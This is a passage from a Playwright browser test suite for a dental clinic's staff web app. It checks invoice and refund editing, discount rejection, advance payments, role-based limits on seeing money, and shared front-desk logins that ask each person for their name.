  const text = await receipt.innerText();
  assert.match(text, /By\s+Card/);
  assert.match(text, /North Nazimabad/);
  await receipt.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
  await plive.evaluate(async () => { const { state } = await import('/js/state.js'); Object.assign(state.data, window.__real); });
  const after = await billingOf(plive, '9825');
  assert.equal(after.payments.length, before + 1, 'one payment, though it was sent twice');
  await openMoney(plive, '9825', 'Kinza Rauf');
  assert.match(await moneyOf(plive).innerText(), /Rs 45,000 unpaid/, 'the invoice with what is unpaid on it');
});
await step('A refund and a closed cash day: the coordinator (no "View invoices and payments") corrects a refund\'s method (its amount is for "Give refunds"); a change to the cash of a closed day asks once more first', async () => {
  await tryAnotherRole(plive);
  await loginAs(plive, 'Dr. Ali Rashid');
  const kinza = await patientId(plive, '9825');
  await plive.evaluate(async (pid) => {
    const { state } = await import('/js/state.js');
    const { localISO } = await import('/js/ui/dom.js');
    await state.data.recordPayment({ patient_id: pid, branch_id: 2, amount: -1000, method: 'cash', invoice_id: null, notes: 'Sample refund' });
    await state.data.closeCash(2, localISO(), 0, null);
  }, kinza);
  await tryAnotherRole(plive);
  await loginAs(plive, 'Clinic coordinator');
  await openMoney(plive, '9825', 'Kinza Rauf');
  const money = moneyOf(plive);
  await money.locator('details summary').click();
  await money.getByRole('button', { name: /^Edit payment, .*1,000 cash$/ }).click();
  const e = plive.locator('.modal', { has: plive.locator('h2', { hasText: /^Edit refund/ }) });
  assert.ok(await e.getByLabel(/Amount given back/).isDisabled(), 'the refund\'s amount: not for the coordinator');
  await e.getByLabel('Method').selectOption('card');
  await e.getByRole('button', { name: 'Save changes' }).click();
  await e.getByText(/is already closed/).waitFor();
  assert.match(await e.locator('.alert-warning').innerText(), /Tell the accountant to check that day's closing/);
  await e.getByRole('button', { name: 'Save changes' }).click();
  await plive.waitForSelector('.toast:has-text("Payment saved as Card.")');
  const { payments } = await billingOf(plive, '9825');
  assert.equal(payments.find((p) => p.notes === 'Sample refund').method, 'card');
  // Editing is not seeing the clinic's money (20261015000400_finance_privacy.sql): no rupees on Today, no pending dues added up.
  await plive.goto(BASE + '#/staff/today');
  await plive.locator('h2:text("Branches today")').waitFor();
  assert.deepEqual(await rupeesShown(plive), [], 'no rupees on the coordinator\'s Today page');
  assert.match(await plive.evaluate(async () => { const { state } = await import('/js/state.js'); try { await state.data.totalDues(); return 'answered'; } catch (e) { return e.message; } }),
    /NOT_ALLOWED/, 'the pending dues are not added up for the coordinator');
});
await step('A discount rejected, then the invoice edited: the line\'s discount went with the rejection, so Edit shows none and saves none (the accountant), and the coordinator is not refused', async () => {
  await tryAnotherRole(plive);
  await loginAs(plive, 'Dr. Ali Rashid');
  await plive.evaluate(async () => { const { state } = await import('/js/state.js'); await state.data.setOverride('s-fd-nn', 'discount.give', true); });
  await tryAnotherRole(plive);
  await loginAs(plive, 'Front desk \\(North Nazimabad\\)');
  await plive.goto(BASE + '#/staff/sheet');
  await plive.locator('table.sheet tbody tr', { hasText: 'Areeba Siddiqui' }).getByRole('button', { name: 'Bill Areeba Siddiqui' }).click();
  const m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Areeba Siddiqui' }) });
  await m.getByLabel('Treatment, line 1').fill('Braces Kit (Metal, sample)');
  await m.getByLabel('Discount, line 1').fill('20000');
  await m.getByLabel('Discount reason').fill('Sample family offer');
  await m.getByLabel('Payment (Rs)').fill('0');
  await m.getByRole('button', { name: 'Save', exact: true }).click();
  const bill = plive.locator('.modal', { has: plive.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  const invNo = (await bill.locator('h2').innerText()).replace('Invoice ', '');
  assert.match(await bill.innerText(), /discount waiting for approval/i);
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
  await tryAnotherRole(plive);
  await loginAs(plive, 'Accountant');
  await plive.evaluate(async (no) => {
    const { state } = await import('/js/state.js');
    const r = (await state.data.discountRequests()).find((x) => x.invoice.invoice_no === no);
    await state.data.decideDiscount(r.id, false);
  }, invNo);
  await openMoney(plive, '9811', 'Areeba Siddiqui');
  await moneyOf(plive).getByRole('button', { name: `Edit invoice ${invNo}` }).click();
  let ei = plive.locator('.modal', { has: plive.locator('h2', { hasText: `Edit invoice ${invNo}` }) });
  assert.equal(await ei.getByLabel('Discount, line 1').inputValue(), '', 'the rejected discount is not shown');
  assert.equal((await ei.locator('.bill-totals').innerText()).replace(/\s+/g, ' ').trim(), 'Sub-total Rs 50,000 Grand total Rs 50,000');
  await ei.getByLabel('Invoice note').fill('Kit fitted');
  await ei.getByRole('button', { name: 'Save changes' }).click();
  await plive.waitForSelector(`.toast:has-text("Invoice ${invNo} saved.")`);
  let saved = (await billingOf(plive, '9811')).invoices.find((i) => i.invoice_no === invNo);
  assert.deepEqual([saved.discount_amount, saved.total, saved.status, saved.items[0].discount_amount, saved.notes], [0, 50000, 'issued', 0, 'Kit fitted'], 'nothing brought the rejected discount back');
  await tryAnotherRole(plive);
  await loginAs(plive, 'Clinic coordinator');
  await openMoney(plive, '9811', 'Areeba Siddiqui');
  await moneyOf(plive).getByRole('button', { name: `Edit invoice ${invNo}` }).click();
  ei = plive.locator('.modal', { has: plive.locator('h2', { hasText: `Edit invoice ${invNo}` }) });
  await ei.getByLabel('Description, line 1').fill('Upper and lower');
  await ei.getByRole('button', { name: 'Save changes' }).click();
  await plive.waitForSelector(`.toast:has-text("Invoice ${invNo} saved.")`);
  saved = (await billingOf(plive, '9811')).invoices.find((i) => i.invoice_no === invNo);
  assert.deepEqual([saved.status, saved.items[0].description], ['issued', 'Braces Kit (Metal, sample) - Upper and lower'], 'the coordinator\'s change is saved');
});
await step('An imported line (the visit type "Bonding", the Healthwire procedure as its description): Edit shows the description whole and a note-only change keeps the line as it was', async () => {
  await tryAnotherRole(plive);
  await loginAs(plive, 'Dr. Ali Rashid');
  const invNo = await plive.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const p = (await state.data.searchPatients('9825')).find((x) => x.mr_number === '9825');
    const bonding = state.ref.treatments.find((t) => t.name === 'Bonding');
    const inv = await state.data.createInvoice({ patient_id: p.id, branch_id: 2, items: [{ description: 'Braces Kit (Made in China, sample), Monthly (x2)', quantity: 1, unit_price: 55000, treatment_id: bonding.id }], discount_amount: 0 });
    return inv.invoice_no;
  });
  await tryAnotherRole(plive);
  await loginAs(plive, 'Accountant');
  await openMoney(plive, '9825', 'Kinza Rauf');
  await moneyOf(plive).getByRole('button', { name: `Edit invoice ${invNo}` }).click();
  const ei = plive.locator('.modal', { has: plive.locator('h2', { hasText: `Edit invoice ${invNo}` }) });
  assert.equal(await ei.getByLabel('Treatment, line 1').inputValue(), 'Bonding');
  assert.equal(await ei.getByLabel('Description, line 1').inputValue(), 'Braces Kit (Made in China, sample), Monthly (x2)', 'the description whole');
  await ei.getByLabel('Invoice note').fill('From Healthwire');
  await ei.getByRole('button', { name: 'Save changes' }).click();
  await plive.waitForSelector(`.toast:has-text("Invoice ${invNo} saved.")`);
  const saved = (await billingOf(plive, '9825')).invoices.find((i) => i.invoice_no === invNo);
  assert.deepEqual([saved.items[0].description, saved.notes], ['Braces Kit (Made in China, sample), Monthly (x2)', 'From Healthwire'], 'the line as it was; the note changed');
});
await step('An advance: paid more than the invoice, the rest goes towards the next invoice: its bill counts it (Paid, Due, "Advance paid earlier"), and the patient\'s page does not show it unpaid', async () => {
  await tryAnotherRole(plive);
  await loginAs(plive, 'Front desk \\(North Nazimabad\\)');
  await stubPrint(plive);
  await plive.goto(BASE + '#/staff/sheet');
  const row = plive.locator('table.sheet tbody tr', { hasText: 'Mariam Akhtar' });
  await row.getByRole('button', { name: 'Bill Mariam Akhtar' }).click();
  let m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Mariam Akhtar' }) });
  await m.getByLabel('Treatment, line 1').fill('Scaling');
  await m.getByLabel('Payment (Rs)').fill('5000');
  assert.equal((await m.locator('.bill-due').innerText()).trim(), 'Advance Rs 1,000 (counts towards the next invoice)');
  await m.getByRole('button', { name: 'Save', exact: true }).click();
  let bill = plive.locator('.modal', { has: plive.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
  await row.getByRole('button', { name: 'Bill Mariam Akhtar' }).click();
  m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Mariam Akhtar' }) });
  await m.getByLabel('Treatment, line 1').fill('Checkup');
  await m.getByLabel('Payment (Rs)').fill('0');
  await m.getByRole('button', { name: 'Save', exact: true }).click();
  bill = plive.locator('.modal', { has: plive.locator('h2', { hasText: /^Invoice INV-/ }) });
  await bill.waitFor();
  const second = (await bill.locator('h2').innerText()).replace('Invoice ', '');
  const text = await bill.locator('.bill-sheet').innerText();
  for (const re of [/Paid Amount\s+Rs\. 1,000/, /Due Amount\s+Rs\. 500/, /Payment Mode: Advance paid earlier/]) assert.match(text, re);
  await bill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
  await openMoney(plive, '9824', 'Mariam Akhtar');
  assert.match(await moneyOf(plive).locator('table.list').first().locator('tbody tr', { hasText: second }).innerText(), /Rs 500 unpaid/, 'the advance counted on the second invoice');
  // The bill the patient opens in their account (View as patient) counts the advance the same way: not "Not paid yet" with the whole
  // amount due.
  await plive.getByRole('link', { name: 'View as patient' }).click();
  await plive.waitForSelector('.alert:has-text("Patient view")');
  await plive.getByRole('button', { name: `View invoice ${second}` }).click();
  const pbill = plive.locator('.modal', { has: plive.locator('h2', { hasText: `Invoice ${second}` }) });
  const ptext = await pbill.locator('.bill-sheet').innerText();
  for (const re of [/Paid Amount\s+Rs\. 1,000/, /Due Amount\s+Rs\. 500/, /Payment Mode: Advance paid earlier/]) assert.match(ptext, re, 'the patient\'s bill: ' + re);
  await pbill.locator('.modal-actions').getByRole('button', { name: 'Close' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
});
await step('A checkup patient registered from the list: Bill in the register dialog, and Bill beside their name on the row', async () => {
  await plive.goto(BASE + '#/staff/sheet');
  await plive.getByRole('button', { name: 'Checkup options for Bareera Khalid' }).click();
  await plive.locator('.modal').getByRole('button', { name: 'Register as patient' }).click();
  const reg = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'Register Bareera Khalid as a patient' }) });
  await reg.getByRole('button', { name: 'Create patient file' }).click();
  await reg.locator('.registered-mr').waitFor();
  await reg.getByRole('button', { name: 'Bill', exact: true }).click();
  let m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Bareera Khalid' }) });
  await m.waitFor();
  assert.equal(await m.getByLabel('Branch').evaluate((s) => s.selectedOptions[0].textContent), 'North Nazimabad');
  await m.getByRole('button', { name: 'Cancel' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
  await plive.getByRole('button', { name: 'Bill Bareera Khalid' }).click();
  m = plive.locator('.modal', { has: plive.locator('h2', { hasText: 'New invoice · Bareera Khalid' }) });
  await m.waitFor();
  await m.getByRole('button', { name: 'Cancel' }).click();
  await plive.waitForSelector('.modal', { state: 'detached' });
});
await plive.close();
await step('Bill on a phone: a name beside Bill is not cut; the invoice form names each box (Rate, Qty, Amount, Performed by) and the doctor is whole', async () => {
  const pp = await newPage({ width: 390, height: 844 }, { hasTouch: true, isMobile: true });
  await loginAs(pp, 'Front desk \\(North Nazimabad\\)');
  await pp.goto(BASE + '#/staff/sheet');
  await pp.getByRole('button', { name: 'Bill Areeba Siddiqui' }).waitFor();
  const cut = await pp.locator('table.sheet tbody tr:not(.is-checkup) .name-cell.has-bill .name-text').evaluateAll((els) => els.filter((e) => e.textContent.length <= 16 && e.scrollWidth > e.clientWidth).map((e) => e.textContent));
  assert.deepEqual(cut, [], 'no name of up to 16 letters is cut');
  await pp.getByRole('button', { name: 'Bill Kinza Rauf' }).click();
  const m = pp.locator('.modal', { has: pp.locator('h2', { hasText: 'New invoice · Kinza Rauf' }) });
  await m.waitFor();
  const labels = await m.locator('.bill-line:not(.bill-line-head)').first().locator('.bill-cell-label').evaluateAll((els) => els.filter((e) => e.offsetParent && e.getBoundingClientRect().height > 0).map((e) => e.textContent));
  for (const name of ['Rate (Rs)', 'Qty', 'Amount', 'Performed by']) assert.ok(labels.includes(name), `${name} is named: ${labels.join(', ')}`);
  assert.ok(await m.getByLabel('Performed by, line 1').evaluate((s) => s.scrollWidth <= s.clientWidth + 1 && s.getBoundingClientRect().width > 250), 'the doctor box has the width of the line');
  await pp.close();
});
=======
// ------------------------------------------------------------- shared logins: "Please enter your name" (the owner, 15 Oct 2026)
// "instead of name picker, just give a popup saying please enter your name". The demo's "Front desk Islamabad" is a shared login.
// The demo keeps its data in the page's memory, so the shared desk and Dr. Ali share one page (hash changes only). A demo login does
// not survive a reload either, so moving to another page stands in for a reload; the name is checked in this tab's sessionStorage.
const pdn = await newPage();
const nameDialog = (pg) => pg.getByRole('dialog', { name: 'Please enter your name' });
const nameBox = (pg) => nameDialog(pg).getByLabel(/^Your name/);
// (textContent: in the top bar the login and the name are boxes of their own, which innerText would put on lines of their own)
const accountLabel = (pg) => pg.locator('.user-menu > button .user-name').evaluate((el) => el.textContent.trim());
// The scope of every logout from now on ('local' = this computer only), recorded around the demo adapter's signOut.
const logoutScopes = (pg) => pg.evaluate(async () => {
  const { state } = await import('/js/state.js');
  if (!state.data.__scopes) {
    const signOut = state.data.signOut.bind(state.data);
    state.data.__scopes = [];
    state.data.signOut = (o) => { state.data.__scopes.push(o?.scope || 'global'); return signOut(o); };
  }
  return state.data.__scopes;
});
const greeting = (pg, name) => pg.locator('h1', { hasText: new RegExp(`^Good (morning|afternoon|evening), ${name}$`) });
await step('shared login: signing in asks "Please enter your name" before anything else; no ×, no Cancel, Escape and a click outside do nothing; a too-short or too-long name is refused', async () => {
  await loginAs(pdn, 'Front desk Islamabad');
  const dlg = nameDialog(pdn);
  await dlg.waitFor();
  assert.equal(await dlg.getByRole('button', { name: 'Close' }).count(), 0, 'no × button');
  assert.equal(await dlg.getByRole('button', { name: 'Cancel' }).count(), 0, 'no Cancel');
  assert.deepEqual((await dlg.locator('.modal-actions button').allInnerTexts()).map((t) => t.trim()), ['Log out', 'Continue'], 'Continue, and Log out for the wrong login');
  assert.equal(await pdn.evaluate(() => document.activeElement?.getAttribute('aria-label') || document.activeElement?.labels?.[0]?.textContent), 'Your name (required)', 'it starts in the name box');
  assert.equal(await pdn.locator('#app').evaluate((el) => el.inert), true, 'the page behind cannot be clicked or typed into');
  assert.equal((await pdn.locator('#main').innerText()).trim(), '', 'nor is the page drawn (or its data read) before the name is given');
  // Another page (Back, a typed address) while it asks: that page asks again, and is not drawn either.
  await pdn.evaluate(() => { location.hash = '#/staff/patients'; });
  await pdn.waitForFunction(() => location.hash === '#/staff/patients');
  await dlg.waitFor();
  await pdn.waitForTimeout(300);
  assert.equal(await nameDialog(pdn).count(), 1, 'one popup');
  assert.equal((await pdn.locator('#main').innerText()).trim(), '', 'the Patients page is not drawn without a name');
  await pdn.evaluate(() => { location.hash = '#/staff/today'; });
  await pdn.waitForFunction(() => location.hash === '#/staff/today');
  await dlg.waitFor();
  await pdn.keyboard.press('Escape');
  await pdn.mouse.click(8, 400); // on the dimmed page, outside the dialog
  await pdn.waitForTimeout(200);
  assert.ok(await dlg.isVisible(), 'Escape and a click outside leave it open');
  await dlg.getByRole('button', { name: 'Continue' }).click();
  assert.equal((await dlg.locator('.field-error').innerText()).trim(), 'Write your name (at least 2 letters).');
  await nameBox(pdn).fill('  S  ');
  await dlg.getByRole('button', { name: 'Continue' }).click();
  assert.equal((await dlg.locator('.field-error').innerText()).trim(), 'Write your name (at least 2 letters).', 'one letter (spaces do not count) is too short');
  await nameBox(pdn).fill('a'.repeat(61));
  await dlg.getByRole('button', { name: 'Continue' }).click();
  assert.equal((await dlg.locator('.field-error').innerText()).trim(), 'Write at most 60 letters.');
  assert.ok(await dlg.isVisible(), 'still asking');
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad', 'no name next to the login yet');
  await shot(pdn, '31-shared-login-name-popup');
});
await step('shared login: Continue (or Enter) puts the name next to the login in the name menu; it stays for the tab, so another page does not ask again', async () => {
  await nameBox(pdn).fill('  Sadia   ');
  await nameBox(pdn).press('Enter');
  await nameDialog(pdn).waitFor({ state: 'detached' });
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad · Sadia');
  assert.equal(await pdn.locator('.user-menu > button').getAttribute('aria-label'), 'Account menu, Front desk Islamabad · Sadia');
  assert.equal(await pdn.locator('#app').evaluate((el) => el.inert), false, 'the page can be used now');
  await pdn.locator('h1', { hasText: /^Good (morning|afternoon|evening), Sadia$/ }).waitFor(); // Today greets the person, not "Front"
  assert.deepEqual(await pdn.evaluate(() => { const k = JSON.parse(sessionStorage.getItem('desk-name')); return [k.staffId, k.name, typeof k.at]; }), ['s-fd-isb', 'Sadia', 'number'], 'kept for this tab, with the time it was last used (a reload within the idle time keeps it)');
  await pdn.locator('.user-menu > button').click();
  assert.equal((await pdn.locator('#user-menu-list .menu-note > span').innerText()).trim(), 'Front desk Islamabad · Sadia');
  assert.equal(await pdn.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).count(), 1, 'Change name is in the name menu');
  await pdn.keyboard.press('Escape');
  await pdn.goto(BASE + '#/staff/patients');
  await pdn.waitForSelector('h1:has-text("Patients")');
  await pdn.waitForTimeout(300);
  assert.equal(await nameDialog(pdn).count(), 0, 'another page does not ask again');
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad · Sadia');
});
await step('shared login: "Change name" asks again at once (the old name stops), offers the names used on this computer, takes an Urdu name, and the page greets the new person', async () => {
  await pdn.goto(BASE + '#/staff/today');
  await greeting(pdn, 'Sadia').waitFor();
  await pdn.locator('.user-menu > button').click();
  await pdn.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).click();
  const dlg = nameDialog(pdn);
  await dlg.waitFor();
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad', 'the old name stops straight away');
  assert.equal(await pdn.evaluate(() => sessionStorage.getItem('desk-name')), null);
  assert.equal(await nameBox(pdn).inputValue(), '', 'the box starts empty (the next person writes their own name)');
  assert.deepEqual(await dlg.locator('datalist option').evaluateAll((os) => os.map((o) => o.value)), ['Sadia'], 'names typed before on this computer are offered');
  assert.equal(await nameBox(pdn).getAttribute('list'), await dlg.locator('datalist').getAttribute('id'));
  await pdn.keyboard.press('Escape');
  assert.ok(await dlg.isVisible(), 'it cannot be closed without a name here either');
  await nameBox(pdn).fill('عائشہ');
  await dlg.getByRole('button', { name: 'Continue' }).click();
  await dlg.waitFor({ state: 'detached' });
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad · عائشہ');
  await greeting(pdn, 'عائشہ').waitFor(); // the page is drawn again for the new person, without moving
  assert.equal(await pdn.evaluate(() => location.hash), '#/staff/today');
});
await step('shared login: a note typed offline stays with the person who typed it: after "Change name" it is not sent under the next name, and goes out when that person gives their name again', async () => {
  const rowsHere = pdn.locator('table.checkup-table tbody tr[data-id]');
  await pdn.goto(BASE + '#/staff/checkups');
  await rowsHere.first().waitFor();
  const id = await rowsHere.first().getAttribute('data-id');
  const notes = () => pdn.locator(`table.checkup-table tbody tr[data-id="${id}"] input[aria-label^="Notes for"]`);
  const before = await notes().inputValue();
  await pdn.context().setOffline(true);
  await pdn.locator('.offline-banner:not([hidden])').waitFor();
  await notes().fill('Typed by the first person, offline (test)');
  await pdn.waitForFunction(() => /Offline: 1 typed change/.test(document.querySelector('.save-state')?.textContent || ''));
  // The next person: Change name. The name list cannot be saved this time; the person still gets through.
  await pdn.evaluate(async () => {
    const { state } = await import('/js/state.js');
    const save = state.data.saveDeskName;
    state.data.saveDeskName = async () => { state.data.saveDeskName = save; throw new Error('Sample save refused (test)'); };
  });
  await pdn.locator('.user-menu > button').click();
  await pdn.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).click();
  await pdn.locator('.toast', { hasText: '1 change typed by عائشہ could not be sent yet. It waits on this computer for عائشہ, until that name is given on this login here again.' }).waitFor();
  await nameBox(pdn).fill('Sample Mehak');
  await nameDialog(pdn).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(pdn).waitFor({ state: 'detached' });
  expectErrors(/Sample save refused/);
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad · Sample Mehak');
  await pdn.context().setOffline(false);
  await rowsHere.first().waitFor();
  await pdn.waitForTimeout(800);
  await pdn.goto(BASE + '#/staff/today');
  await pdn.goto(BASE + '#/staff/checkups');
  await notes().waitFor();
  assert.equal(await notes().inputValue(), before, 'not sent under the next person\'s name');
  // The first person back at the desk: their note goes out, under their name.
  await pdn.locator('.user-menu > button').click();
  await pdn.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).click();
  await nameBox(pdn).fill('عائشہ');
  await nameDialog(pdn).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(pdn).waitFor({ state: 'detached' });
  await pdn.waitForFunction(() => document.querySelector('.save-state')?.textContent.trim() === 'All changes saved');
  await pdn.goto(BASE + '#/staff/today');
  await pdn.goto(BASE + '#/staff/checkups');
  await notes().waitFor();
  assert.equal(await notes().inputValue(), 'Typed by the first person, offline (test)', 'sent once that name was given again');
});
await step('shared login, no idle logout (0 = never; the demo has no setting at all): the name holds through the shift, and after 12 hours without use the first click asks again instead of being used under the old name', async () => {
  // The clock moved on in this page only (Date.now), as on a computer left on overnight.
  const later = (hours) => pdn.evaluate((h) => {
    window.__realNow ||= Date.now.bind(Date);
    Date.now = h ? () => window.__realNow() + h * 3600 * 1000 : window.__realNow;
  }, hours);
  assert.equal(await pdn.evaluate(async () => (await import('/js/state.js')).state.ref.settings?.session_timeout_minutes ?? null), null, 'the demo has no idle logout setting');
  await pdn.goto(BASE + '#/staff/today');
  await greeting(pdn, 'عائشہ').waitFor();
  await later(11);
  await pdn.goto(BASE + '#/staff/patients');
  await pdn.waitForSelector('h1:has-text("Patients")');
  await pdn.waitForTimeout(300);
  assert.equal(await nameDialog(pdn).count(), 0, 'the next page within the shift (11 hours) does not ask');
  await later(13);
  await pdn.locator('.topnav a:has-text("Today")').click();
  await nameDialog(pdn).waitFor();
  assert.equal(await pdn.evaluate(() => location.hash), '#/staff/patients', 'the click was not used (under the old name)');
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad', 'the old name stopped');
  assert.equal(await pdn.evaluate(() => sessionStorage.getItem('desk-name')), null);
  await later(0);
  await nameBox(pdn).fill('عائشہ');
  await nameDialog(pdn).getByRole('button', { name: 'Continue' }).click();
  await nameDialog(pdn).waitFor({ state: 'detached' });
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad · عائشہ');
  await pdn.waitForSelector('h1:has-text("Patients")'); // drawn again for the person who gave the name, on the same page
  assert.equal(await pdn.evaluate(() => location.hash), '#/staff/patients');
});
await step('shared login: End the day is put down to the name at the desk ("ended by Front desk Islamabad (name)"); a new sign-in asks again, and Log out in the popup logs out', async () => {
  await pdn.goto(BASE + '#/staff/sheet');
  await pdn.getByRole('button', { name: 'End the day' }).click();
  await pdn.locator('.modal').getByRole('button', { name: 'End the day' }).click();
  await pdn.waitForSelector('.toast:has-text("Day ended. Copy saved in History.")');
  await pdn.goto(BASE + '#/staff/day-history');
  await pdn.waitForSelector('.day-history-list a');
  const today = await dayInfo(pdn, 0);
  const lines = await historyLines(pdn);
  assert.match(lines[0], new RegExp(`^${today.label} – Islamabad – .* Ended \\d{2}:\\d{2} by Front desk Islamabad \\(عائشہ\\)$`), lines[0]);
  // The same login signing in again (another person, later): asked again. Logging out of a shared login ends it on this computer
  // only: the same login stays signed in at the other desks (and computers) that use it.
  assert.deepEqual(await logoutScopes(pdn), []);
  await tryAnotherRole(pdn);
  assert.deepEqual(await logoutScopes(pdn), ['local'], 'this computer only');
  assert.equal(await pdn.evaluate(() => sessionStorage.getItem('desk-name')), null, 'the name ends with the login');
  await loginAs(pdn, 'Front desk Islamabad');
  const dlg = nameDialog(pdn);
  await dlg.waitFor();
  assert.equal(await accountLabel(pdn), 'Front desk Islamabad');
  assert.deepEqual(await dlg.locator('datalist option').evaluateAll((os) => os.map((o) => o.value)), ['عائشہ', 'Sample Mehak', 'Sadia'], 'the latest name first');
  await dlg.getByRole('button', { name: 'Log out' }).click();
  await pdn.waitForSelector('.door');
  assert.equal(await nameDialog(pdn).count(), 0);
  assert.deepEqual(await logoutScopes(pdn), ['local', 'local'], 'Log out in the popup: this computer only');
});
await step('a personal login never sees the popup, nor "Change name"', async () => {
  await loginAs(pdn, 'Front desk \\(Gulshan\\)');
  await pdn.waitForTimeout(400);
  assert.equal(await nameDialog(pdn).count(), 0, 'no popup');
  assert.equal(await accountLabel(pdn), 'Front desk (Gulshan)');
  await pdn.locator('.user-menu > button').click();
  assert.equal(await pdn.locator('#user-menu-list').getByRole('button', { name: 'Change name' }).count(), 0, 'no Change name');
  await pdn.keyboard.press('Escape');
  await tryAnotherRole(pdn);
  assert.deepEqual(await logoutScopes(pdn), ['local', 'local', 'global'], 'a personal login logs out as before (everywhere)');
});
await step('Dr. Ali: Staff accounts shows "Shared" and "Names used" (newest first); he marks another account shared, makes a new shared account, and the audit log names the person at the desk', async () => {
  await loginAs(pdn, 'Dr. Ali Rashid');
  assert.equal(await nameDialog(pdn).count(), 0, 'Dr. Ali is not asked');
  await pdn.goto(BASE + '#/staff/admin?tab=staff');
  const isb = pdn.locator('tr', { hasText: 'demo.frontdesk.isb@example.com' });
  await isb.waitFor();
  assert.equal(await isb.locator('.badge', { hasText: 'Shared' }).count(), 1, 'the shared login says so');
  assert.equal(await pdn.locator('tr', { hasText: 'demo.frontdesk2@example.com' }).locator('.badge', { hasText: 'Shared' }).count(), 0, 'a personal login does not');
  assert.equal(await pdn.locator('tr', { hasText: 'demo.admin@example.com' }).getByRole('button', { name: /^Shared login/ }).count(), 0, 'no Shared login button on the admin row');
  await isb.getByRole('button', { name: 'Names used, Front desk Islamabad' }).click();
  const names = pdn.getByRole('dialog', { name: 'Names used · Front desk Islamabad' });
  await names.waitFor();
  assert.deepEqual((await names.locator('tbody tr td:nth-child(2)').allInnerTexts()).map((t) => t.trim()),
    ['عائشہ', 'عائشہ', 'عائشہ', 'Sadia', 'Hina (sample)', 'Sadia (sample)', 'Mehak (sample)', 'Sadia (sample)'], 'newest first, the ones typed today on top (the save of "Sample Mehak" failed on purpose; عائشہ again after 12 hours without use)');
  assert.match(await names.locator('p').first().innerText(), /^5 names in the last 60 days: /);
  assert.match(await names.locator('tbody tr').first().locator('td').first().innerText(), /\d{2}:\d{2}$/, 'with the date and time');
  await shot(pdn, '32-names-used');
  await names.getByRole('button', { name: 'Done' }).click();
  // Mark Front desk (Gulshan) as a shared login from its row.
  const gul = pdn.locator('tr', { hasText: 'demo.frontdesk2@example.com' });
  assert.equal(await gul.getByRole('button', { name: /^Names used/ }).count(), 0, 'no Names used on a personal login');
  await gul.getByRole('button', { name: 'Shared login, Front desk (Gulshan)' }).click();
  const sm = pdn.getByRole('dialog', { name: 'Shared login · Front desk (Gulshan)' });
  await sm.getByLabel('Shared login — several people use it; it asks for their name when they sign in').check();
  await sm.getByRole('button', { name: 'Save' }).click();
  await pdn.waitForSelector('.toast:has-text("Saved. Front desk (Gulshan) asks for a name at every sign-in.")');
  await gul.locator('.badge', { hasText: 'Shared' }).waitFor();
  await gul.getByRole('button', { name: 'Names used, Front desk (Gulshan)' }).click();
  await pdn.getByRole('dialog', { name: 'Names used · Front desk (Gulshan)' }).getByText('Nobody has entered a name on this login in the last 60 days.').waitFor();
  await pdn.getByRole('dialog', { name: 'Names used · Front desk (Gulshan)' }).getByRole('button', { name: 'Done' }).click();
  // A new account made as a shared login.
  await pdn.getByRole('button', { name: 'New staff account' }).click();
  const m = pdn.getByRole('dialog', { name: 'New staff account' });
  await m.getByPlaceholder('Full name').fill('Assistants Sample Branch');
  await m.locator('input[type=email]').fill('assistants.sample@dralirashid.com');
  await m.getByLabel('Shared login — several people use it; it asks for their name when they sign in').check();
  await m.getByRole('button', { name: 'Create account' }).click();
  const made = pdn.locator('tr', { hasText: 'assistants.sample@dralirashid.com' });
  await made.locator('.badge', { hasText: 'Shared' }).waitFor();
  // ... and made a personal login again from its row.
  await made.getByRole('button', { name: 'Shared login, Assistants Sample Branch' }).click();
  const off = pdn.getByRole('dialog', { name: 'Shared login · Assistants Sample Branch' });
  const box = off.getByLabel('Shared login — several people use it; it asks for their name when they sign in');
  assert.equal(await box.isChecked(), true, 'the box shows it is shared now');
  await box.uncheck();
  await off.getByRole('button', { name: 'Save' }).click();
  await pdn.waitForSelector('.toast:has-text("Saved. Assistants Sample Branch is a personal login again.")');
  await made.locator('.badge', { hasText: 'Shared' }).waitFor({ state: 'detached' });
  assert.equal(await made.getByRole('button', { name: /^Names used/ }).count(), 0, 'no Names used on it any more');
  // The audit log: End the day from the shared desk, put down to the name typed there.
  await pdn.goto(BASE + '#/staff/admin?tab=audit');
  await pdn.waitForSelector('h2:text("Recent changes")');
  await pdn.locator('table.list tr', { hasText: 'end_day' }).filter({ hasText: 'Front desk Islamabad (عائشہ)' }).first().waitFor();
  await pdn.locator('table.list tr', { hasText: 'checkups' }).filter({ hasText: 'Front desk Islamabad (عائشہ)' }).first().waitFor();
  assert.equal(await pdn.locator('table.list tr', { hasText: 'Sample Mehak' }).count(), 0, 'nothing was put down to the person who did not type it');
  // Front desk (Gulshan) is asked for a name now.
  await tryAnotherRole(pdn);
  await loginAs(pdn, 'Front desk \\(Gulshan\\)');
